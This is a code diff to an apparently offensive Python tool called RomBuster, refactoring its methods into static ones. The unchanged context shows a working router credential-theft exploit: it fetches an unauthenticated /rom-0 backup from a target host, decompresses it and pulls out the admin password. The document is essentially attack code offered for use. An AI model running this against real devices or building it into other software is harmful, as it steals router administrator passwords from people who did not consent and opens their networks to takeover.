@@ -31,14 +31,16 @@ from .deps.lzs_decompress import LZSDecompress, RingList
 
 
 class RomBuster:
-    def connect(self, host):
+    @staticmethod
+    def connect(host):
         try:
             response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
         except Exception:
             return None
         return response
 
-    def exploit(self, response):
+    @staticmethod
+    def exploit(response):
         if response.status_code == 200:
             data = response.content[8568:]
             result, window = LZSDecompress(data, RingList(2048))
@@ -46,7 +48,5 @@ class RomBuster:
             password = re.findall("([\040-\176]{5,})", result)
             if len(password):
                 return password[0]
-            else:
-                return None
-        else:
             return None
+        return None
